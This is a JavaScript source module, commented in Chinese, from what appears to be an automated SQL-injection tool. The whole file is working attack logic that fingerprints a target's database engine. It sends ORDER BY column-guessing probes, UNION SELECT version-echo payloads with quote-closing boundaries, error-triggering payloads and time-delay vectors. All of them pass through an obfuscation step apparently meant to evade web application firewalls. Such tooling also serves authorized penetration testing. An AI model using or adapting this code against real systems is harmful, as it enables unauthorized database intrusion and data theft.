import { FINGERPRINT, DB_VERSION, nullSequence, dbmsFromError, TIME_VECTORS, PAYLOADS, fillPayload } from './payloads.js';
import { parseDbmsVersion } from './dbmsVersion.js';
import {
  buildInjectionRequest,
  sendInjection,
  obfuscateIfNeeded,
  discoverEchoColumns,
} from './injection.js';
import { binaryGuessColumns } from './columnGuess.js';
// [P0-FIX 2026-09-09] 时间指纹必须区分「响应回来了但很快」与「根本没拿到响应」：
// sendInjection 失败时现在返回带 __netErr 的对象（不再是 null），若仍只看 `res &&` 就会把
// 「超时失败」当成「延迟命中」→ 误定库 → payload 族错配 → 整轮漏检。
import { isUnusableResponse } from './egressOpts.js';
import { _colGuessCache, colGuessScopeKey } from './Extractor.js';
import { unionDebug, unionDebugEnabled } from './unionDebug.js';
import { stripEchoedPayload } from './echoStrip.js';
import { WRAP, WRAP_NOCAST, HIGH_FREQ_DBMS, fromDummy, resolveFromClause } from './DialectSqlBuilder.js';

// [⑬] DialectSqlBuilder 收敛：WRAP/HIGH_FREQ_DBMS/fromDummy 原定义于此，现已收敛到
// DialectSqlBuilder.js 单一事实源。此处 re-export 保持向后兼容。
export { WRAP, HIGH_FREQ_DBMS, fromDummy };

// 数据库指纹识别器：按响应头特征 + UNION 版本回显判定 dbms
export class DBFingerprinter {
  /**
   * @param {object} ctx { httpClient, target, point, config }
   * @returns {Promise<{dbms: string|null, version?: any, baseline?: {status:number, headers:object, body:string}}>}
   *   version 仅在版本识别成功时存在（parseDbmsVersion 的结果，供按版本选 payload）
   *   dbms: 命中的数据库类型；baseline: 指纹阶段已抓取的良性基线响应（供 WAF 识别复用，零额外发包）
   */
  async fingerprint(ctx) {
    const { httpClient, target, point, config } = ctx;
    const maxCols = config?.maxColumnsGuess ?? 50;
    const obf = (s) => obfuscateIfNeeded(ctx, s);

    const baseReq = buildInjectionRequest(target, point, obf(point.originalValue || '1'));
    const _t0 = Date.now();
    const baseline = await sendInjection(httpClient, ctx, baseReq);
    // 基线 RTT：时间向量定库的阈值补偿基准（高延迟网络防第一个向量即误命中）
    const baselineRtt = Date.now() - _t0;
    // 归一化基线响应（status/headers/body），供 WAF 指纹识别复用，不发起任何新请求
    const baselineResp = {
      status: baseline?.status ?? 0,
      headers: baseline?.headers ?? {},
      body: String(baseline?.data ?? ''),
    };
    const baseLen = baselineResp.body.length;

    // 1) 猜列数（ORDER BY 二分，请求数 ~log2(maxCols)，与 UnionDetector/Extractor 统一）
    // [CRS-FIX 2026-09-10] 探针必须带闭合前缀（与 UnionDetector 的 `${orig}${boundary} ORDER BY n` 一致）。
    // 漏掉 boundary 时，字符串型注入点上 ORDER BY 整句落在引号内 → 恒为合法 SQL → 二分永不收敛
    // → 猜到 maxCols 上限（实测 50）→ 经 _colGuessCache 污染 UnionDetector → UNION 全线空转。
    const boundary = point?.boundary || '';
    const columns = await binaryGuessColumns(
      (n) =>
        sendInjection(
          httpClient,
          ctx,
          buildInjectionRequest(target, point, obf(`${point.originalValue || '1'}${boundary} ORDER BY ${n}-- -`))
        ),
      { baseLen, maxCols, cache: _colGuessCache, cacheKey: colGuessScopeKey(target, point?.id) }
    );

    // 2) 响应头快速识别（命中即定库，无需 UNION）
    const headers = baseline?.headers || {};
    for (const [dbms, sigs] of Object.entries(FINGERPRINT)) {
      const hit = sigs.some((s) => {
        const hv = headers[s.header.toLowerCase()];
        return hv != null && s.match.test(hv);
      });
      if (hit) return { dbms, baseline: baselineResp };
    }

    // 3) 定位回显列（标记 UNION），无回显则无法走 UNION 指纹
    const echoCols = await discoverEchoColumns(httpClient, ctx, columns);

    // 4) 各库版本函数置于首个回显列，检测标记间版本特征
    // MariaDB 置于遍历首位（优先命中），且复用以 MySQL 的 WRAP（协议互通）
    if (echoCols.length) {
      const order = ['MariaDB', ...Object.keys(DB_VERSION).filter((k) => k !== 'MariaDB')];
      for (const dbms of order) {
        const info = DB_VERSION[dbms];
        // 协议兼容库（MariaDB/TiDB→MySQL，DM8→Oracle）复用对应 WRAP 分支
        const wrapKey = dbms === 'MariaDB' || dbms === 'TiDB' ? 'MySQL' : dbms === 'DM8' ? 'Oracle' : dbms;
        const nulls = nullSequence(columns).split(',');
        // [TYPE-FIX 2026-09-20] 标记必须落在**字符型**回显列上，而原实现无条件用 echoCols[0]。
        // 真引擎实测（e2e/multi-engine-lab NO_WAF=1，HSQLDB 2.7.3）：同一条 UNION 探针
        //   放第 1 列（name VARCHAR）→ 正常回显 `__S__HSQLDB 103__E__`
        //   放第 0 列（id INTEGER） → `incompatible data types in combination`，整条 UNION 报错
        // 也就是严格类型库上版本回显定库**恒失败**，而且失败得和"探针跑不动"一模一样（echo=N）。
        // H2 之所以能过，是因为它以 MODE=MySQL 运行、会隐式转类型——不是引擎判据对了。
        //
        // 代价考虑：不能对所有 18 个候选都试多个列（每多试一列 = 每候选多 1 请求，实测本
        // 靶场 206 请求会涨到 ~240）。所以只对**声明了 `from` 的候选**（HSQLDB/Derby 这类
        // 已知需要走字符列的严格类型库）换列重试；其余 16 个库的请求数与形状一字不变。
        const tryCols = info.from ? echoCols : [echoCols[0]];
        for (const idx of tryCols) {
          const cols = nulls
            .map((_, i) => (i === idx ? ((ctx.config?.noCast && WRAP_NOCAST[wrapKey]) ? WRAP_NOCAST[wrapKey](info.func) : WRAP[wrapKey](info.func)) : 'NULL'))
            .join(',');
          // UNION SELECT 的伪表：Oracle/DM8→dual，DB2/Firebird/Informix→各自专属伪表，其余省略
          // [EXCL-FIX 2026-09-20] 若该条目自带 `from`，它**优先于**方言伪表与用户 --union-from：
          // 这类探针的区分力整个建立在"这个 FROM 只在自家库存在"上，被覆盖掉就退化成
          // 一条谁都能执行的常量串——正是 2026-09-16 DB2 误判事故的那个形状。
          // 所以这里不是优先级疏忽，是判据的一部分；用户显式 --union-from 对这些条目无效，
          // 由 DB_VERSION 注释与本行共同说明。
          const fromDummySql = info.from
            ? ` ${info.from}`
            : resolveFromClause(dbms, ctx?.config?.unionFrom);
          // [CRS-FIX 2026-09-10] 补闭合前缀（同 ORDER BY 探针）：否则 UNION 整句落在引号内
          const payload = `${point.originalValue || '1'}${boundary} UNION SELECT ${cols}${fromDummySql}-- -`;
          const sent = obf(payload);
          const res = await sendInjection(
            httpClient,
            ctx,
            buildInjectionRequest(target, point, sent)
          );
        // [ECHO-FIX 2026-09-18] 先剔除「响应里回显的本条 payload」，再取 `__S__…__E__` 标记。
        // 目标把注入值原样打回页面时（实测 blackbox-lab 真 MySQL 回显 `sql=…`），页面里会出现
        // **两份**标记：一份来自被回显的 SQL 文本本身（`__S__',CAST((version()) AS CHAR),'__E__`），
        // 一份来自真正执行出来的结果行。`match` 取第一处 → 永远拿到 SQL 文本那份 → 18 个库的
        // sig 全部落空 → 版本回显定库通道在回显型目标上**整条失效**（实测 verFp 18/18 未命中），
        // 只能退化到报错/时间向量定库，而这两条通道正是误判 ClickHouse/DB2 的发生地。
        const body = stripEchoedPayload(String(res?.data ?? ''), sent);
        // D6: 大小写不敏感匹配（免疫 lowercase/uppercase/mixedcase tamper 破坏标记）
        const m = body.match(/__S__(.*?)__E__/is);
        const ver = m ? m[1] : '';
        if (unionDebugEnabled()) {
          unionDebug(`verFp ${dbms} echo=${m ? 'Y' : 'N'} 取到值=${JSON.stringify(ver.slice(0, 60))} sig命中=${info.sig.test(ver)}`);
        }
        if (info.sig.test(ver)) {
          // [P1-FIX 2026-09-05] 一并返回解析后的版本：原实现拿到版本串只用于定库即丢弃，
          // 引擎无法按版本选 payload/枚举 SQL（MSSQL<2017 无 string_agg、MySQL<5.7 用 password 列）
          return { dbms, version: parseDbmsVersion(dbms, ver), baseline: baselineResp };
        }
        }
      }
    }

    // 5) 报错签名定库（P1-D3）：无回显列时，按高频库顺序注入各库报错 payload，
    //    命中响应中的 per-dbms 报错特征即停（不再死回退 MySQL）。
    const errDbms = await this._fingerprintByError(ctx, httpClient, target, point, obf);
    if (errDbms) return { dbms: errDbms, baseline: baselineResp };

    // 6) 时间向量定库（P1-D3）：报错不命中时，注入各库独有延时原语观测耗时定库。
    const timeDbms = await this._fingerprintByTime(ctx, httpClient, target, point, obf, config, baselineRtt);
    if (timeDbms) return { dbms: timeDbms, baseline: baselineResp };

    return { dbms: null, baseline: baselineResp };
  }

  // 报错签名定库：遍历高频库顺序，注入各库 error[0]，对响应跑 dbmsFromError，命中即停。
  // [OPT-FIX 2026-09-08] 报错预检：先发 1 个通用语法破坏探针（单引号闭合破坏——任何
  // 会把报错回显给客户端的目标都会在此暴露报错特征）；预检无任何报错签名 → 目标是
  // 静默型（吞错误回正常/空页），16 库报错遍历必然全部落空 → 直接跳过（省 ~16 请求/点）。
  // 语言级头特征移除后无报错目标（如 time_only 场景）的指纹成本 28→152 请求，此预检
  // 将其压回 ~40 以内。预检失败（网络错误）→ 保守跳过遍历（与原语义同为"报错路径无产出"，
  // 由时间向量/检测器层兜底）。
  async _fingerprintByError(ctx, httpClient, target, point, obf) {
    const orig = point.originalValue || '1';
    // 预检：单引号闭合破坏（跨库通用的语法错误触发器）
    try {
      const preRes = await sendInjection(
        httpClient,
        ctx,
        buildInjectionRequest(target, point, obf(`${orig}'`))
      );
      const preHit = dbmsFromError(String(preRes?.data ?? ''));
      // 预检即命中签名：直接定库（常见于报错回显目标，省多库遍历）。
      // 注意：预检无报错 ≠ 可跳过遍历——目标可能转义引号（quote 探针被吞）但函数类
      // 报错 payload（extractvalue 等）仍触发报错（detect.phase2 Oracle 用例实证），
      // 跳过会产生漏检。故预检只做正向加速，不做负向剪枝。
      if (preHit) return preHit;
    } catch {
      /* 预检失败：继续正常遍历（保守） */
    }
    for (const dbms of HIGH_FREQ_DBMS) {
      const tpl = (PAYLOADS[dbms] && PAYLOADS[dbms].error && PAYLOADS[dbms].error[0]) || '';
      if (!tpl) continue;
      const payload = obf(fillPayload(tpl, { orig }));
      const res = await sendInjection(
        httpClient,
        ctx,
        buildInjectionRequest(target, point, payload)
      );
      const hit = dbmsFromError(String(res?.data ?? ''));
      if (hit) return hit;
    }
    return null;
  }

  // 时间向量定库：注入各库独有延时原语，观测耗时超阈值即停（非注入点各向量快速返回，无额外 sleep 成本）。
  // 阈值补偿（历史 bug）：固定 800ms 在高 RTT 网络下第一个向量即误命中（基线就要 900ms）→ 方言判错级联漏报。
  // 有效阈值 = 基线RTT + 配置阈值：延时信号必须显著超出该目标的正常往返，而非绝对墙钟。
  async _fingerprintByTime(ctx, httpClient, target, point, obf, config, baselineRtt = 0) {
    const orig = point.originalValue || '1';
    // [CTX-FIX 2026-09-18] 闭合前缀必须带进向量：向量顺序即优先级，只有每条都能真正执行时，
    // 「谁延时」才等于「谁是目标库」。不带 boundary 时字符串型点上 MySQL 向量落在字面量内
    // （恒不延时），反而让自带引号的靠后向量（ClickHouse/H2）在真 MySQL 上睡成功 → 误定库。
    const bd = typeof point.boundary === 'string' ? point.boundary : '';
    const sleepSec = config?.fingerprintSleepSec ?? 1;
    const thresholdMs = config?.fingerprintTimeThresholdMs ?? 800;
    const effThreshold = baselineRtt + thresholdMs;
    const dbg = unionDebugEnabled();
    if (dbg) unionDebug(`timeFp 起点 boundary=${JSON.stringify(bd)} baseRtt=${baselineRtt}ms 阈值=${effThreshold}ms sleep=${sleepSec}s`);
    for (const { dbms, payload } of TIME_VECTORS) {
      const filled = obf(fillPayload(payload, { orig, bd, sleep: sleepSec }));
      const t0 = Date.now();
      const res = await sendInjection(
        httpClient,
        ctx,
        buildInjectionRequest(target, point, filled)
      );
      if (dbg) unionDebug(`timeFp ${dbms} ms=${Date.now() - t0} status=${res?.status ?? '-'} unusable=${res ? isUnusableResponse(res) : 'null'}`);
      if (res && !isUnusableResponse(res) && Date.now() - t0 >= effThreshold) {
        // [OPT-FIX 2026-09-08] 串行复验防瞬时毛刺误判：基线 RTT 很小的目标上阈值余量低
        // （实测 L04：RTT 14ms、阈值 814ms），GC/调度尖峰即可单次击穿 → 误定库（实测误判
        // Sybase → payload 族错配 → 漏检）。复验同向量串行再发 1 次，两次均延迟才定库；
        // 复验未达标视为毛刺，继续下一向量。
        const t1 = Date.now();
        const res2 = await sendInjection(
          httpClient,
          ctx,
          buildInjectionRequest(target, point, filled)
        );
        if (res2 && !isUnusableResponse(res2) && Date.now() - t1 >= effThreshold) return dbms;
      }
      // [OPT-FIX 2026-09-08] 报错签名剪枝：时间向量触发的报错若带可识别 DBMS 签名
      // （如 SQLite 的 unrecognized token / PG 的 syntax error at or near），直接定库返回，
      // 跳过剩余向量（未知 SQLite 目标此前要串行试满 9 库向量，time 场景实测 28.9s）。
      // 安全性：签名均为厂商短语（不含注入函数名——extractvalue 等污染特征已清理），
      // 异构库收到本库向量只会返回目标自身方言的报错 → 定库结果即目标真实方言。
      if (res && !isUnusableResponse(res)) {
        const errDbms = dbmsFromError(String(res?.data ?? ''));
        if (errDbms) return errDbms;
      }
    }
    return null;
  }
}

export default DBFingerprinter;
